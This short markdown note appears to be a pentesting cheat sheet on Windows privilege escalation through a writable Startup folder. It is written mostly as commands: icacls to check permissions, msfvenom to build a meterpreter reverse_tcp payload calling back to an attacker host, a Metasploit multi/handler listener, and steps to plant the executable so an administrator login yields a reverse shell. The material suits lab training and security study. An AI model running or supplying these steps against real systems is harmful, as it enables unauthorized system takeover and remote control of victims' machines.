# Startup Applications 

A startup application is a program that is automatically launched by Windows when the system boots or when a user logs in

**Victim**

```
// to get the informations about the startup apps, type in cmd 
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

// From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory 
```

**Attacker**

```
// generating a payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip -f exe -o x.exe

// now open metasploit framework 
msfconsole 
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost attacker_ip
run
```

Now using the python server transfer x.exe to the windows machine and save the file in "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

Now log out the low privileged user account in the windows machine and when we login as high privileged account into the windows machine, we gain the reverse shell due to the malicious startup software 

```
// we gained reverse shell for high privileged account 
getuid 
server username: Administrator 
```
